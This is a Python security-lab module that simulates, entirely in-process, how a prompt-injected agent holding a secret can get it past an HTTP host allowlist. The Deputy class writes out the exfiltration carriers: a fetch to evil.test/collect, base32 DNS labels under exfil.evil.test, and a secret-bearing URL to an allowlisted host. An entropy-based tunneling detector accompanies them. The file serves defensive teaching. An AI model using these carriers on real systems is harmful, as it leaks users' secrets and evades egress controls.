"""Lab 32 — Egress covert channels that bypass an HTTP-only egress allowlist.

Intentionally vulnerable, offline, stdlib only, synthetic LAB-CANARY-* markers, NO network I/O.
Everything here is in-process: the "deputy" (an agent that holds a secret and can act outward),
an HTTP egress gateway that enforces a host allowlist, and a local DNS resolver that logs the
queries it is asked to resolve. Nothing binds to a socket and nothing leaves the process.

The lesson (05.1, "Advanced extension: egress covert channels") teaches that an egress *host*
allowlist caps exfiltration over the channel it guards (HTTP), but an attacker who obeys a
confused deputy can route the secret out through a *different* legitimate capability:

  * DNS resolution — the secret is encoded into the query's labels; the allowlisted HTTP gateway
    never sees it, but an attacker-controlled authoritative resolver does (MITRE ATT&CK
    T1071.004, DNS as an application-layer C2/exfil channel; the OpenAI 2026 sandbox incident).
  * A legitimate web-fetch tool — the secret rides in the URL of a benign-looking fetch the agent
    was convinced it needed to make (LLMLeak / "The Innocent Courier", arXiv:2610.01768).

Both carriers reach the attacker while an HTTP-destination allowlist reports "nothing exfiltrated."
"""
from __future__ import annotations

import base64
import math
import re
import uuid

CANARY = re.compile(r"LAB-CANARY-[0-9a-f-]+")


def canary() -> str:
    return f"LAB-CANARY-{uuid.uuid4()}"


# --- local collectors (stand in for attacker-controlled infrastructure, all in-process) --------

class HttpGateway:
    """The only HTTP egress path the deputy has. Enforces a destination-host allowlist."""

    def __init__(self, allowed_hosts: set[str]):
        self.allowed = set(allowed_hosts)
        self.sent: list[str] = []      # requests that passed the allowlist (what really left)
        self.blocked: list[str] = []   # requests the allowlist stopped

    def fetch(self, host: str, path: str) -> bool:
        """Return True iff the request was allowed to leave. Records either way."""
        if host in self.allowed:
            self.sent.append(f"{host}{path}")
            return True
        self.blocked.append(f"{host}{path}")
        return False


class DnsResolver:
    """A recursive resolver the deputy may call for ANY name (the common default).

    `authority_log` is what an attacker who runs the authoritative server for a domain would see:
    the full query name, labels and all. Optionally enforces a resolver-side name allowlist and a
    per-query anomaly detector.
    """

    def __init__(self, allowed_zones: set[str] | None = None, detector=None):
        self.allowed_zones = allowed_zones            # None => resolve anything (vulnerable)
        self.detector = detector                      # callable(name)->bool: True == flag/drop
        self.authority_log: list[str] = []            # names that actually went out to resolve
        self.flagged: list[str] = []

    def resolve(self, name: str) -> bool:
        """Return True iff the name was resolved (query emitted). Records what leaked."""
        if self.detector and self.detector(name):
            self.flagged.append(name)
            return False
        if self.allowed_zones is not None and not any(
            name == z or name.endswith("." + z) for z in self.allowed_zones
        ):
            return False
        self.authority_log.append(name)              # attacker's authoritative server sees this
        return True


# --- the deputy: an agent that holds a secret and will act on an injected instruction ----------

def _labelize(secret: str, zone: str) -> str:
    """Encode a secret into DNS labels under an attacker zone.

    base32 is what real DNS tunnels use: case-insensitive, label-legal, and high-entropy — which
    is exactly the signature a query-anomaly detector keys on (long, near-random labels).
    """
    payload = base64.b32encode(secret.encode("utf-8")).decode("ascii").rstrip("=").lower()
    chunks = [payload[i:i + 48] for i in range(0, len(payload), 48)]  # <=63 chars/label
    return ".".join(chunks) + "." + zone


class Deputy:
    """Holds a synthetic secret; exposes exactly two outward capabilities (http_fetch, dns_lookup).

    `obey=True` models a successfully injected confused deputy (05.1): it will try to carry the
    secret out. Which carrier it uses is the attacker's choice of payload.
    """

    def __init__(self, http: HttpGateway, dns: DnsResolver, attacker_zone: str = "exfil.evil.test"):
        self.secret = canary()
        self.http = http
        self.dns = dns
        self.zone = attacker_zone

    # carrier 1: direct HTTP to the attacker host (what the allowlist is built to stop)
    def exfil_http(self) -> bool:
        return self.http.fetch("evil.test", f"/collect?d={self.secret}")

    # carrier 2: DNS labels to the attacker zone (HTTP allowlist never sees this)
    def exfil_dns(self) -> bool:
        return self.dns.resolve(_labelize(self.secret, self.zone))

    # carrier 3: the secret ride-along in a legitimate-looking fetch to an ALLOWLISTED host that
    # proxies/redirects (LLMLeak): the agent "needs" docs.corp.test/migrate?ref=<secret>
    def exfil_tool_carrier(self) -> bool:
        return self.http.fetch("docs.corp.test", f"/migrate?ref={self.secret}")

    # a benign DNS lookup the agent legitimately makes (used to measure detector false positives)
    def benign_lookup(self, host: str) -> bool:
        return self.dns.resolve(host)


# --- detector: query-name anomaly scoring (entropy + label length), with a tunable threshold ---

def shannon_entropy(s: str) -> float:
    if not s:
        return 0.0
    counts = {ch: s.count(ch) for ch in set(s)}
    n = len(s)
    return -sum((c / n) * math.log2(c / n) for c in counts.values())


def make_dns_detector(entropy_thresh: float = 3.6, max_label: int = 40):
    """Flag a query name whose longest label is long AND high-entropy (tunneling signature)."""
    def detect(name: str) -> bool:
        labels = name.split(".")
        longest = max(labels, key=len)
        return len(longest) >= max_label and shannon_entropy(longest) >= entropy_thresh
    return detect


def recovered(log: list[str], secret: str) -> bool:
    """Did the secret reach the attacker's collector, in any (incl. base32-encoded) form?"""
    payload_b32 = base64.b32encode(secret.encode("utf-8")).decode("ascii").rstrip("=").lower()
    for entry in log:
        if secret in entry:
            return True
        if payload_b32.replace(".", "") in entry.replace(".", ""):
            return True
    return False
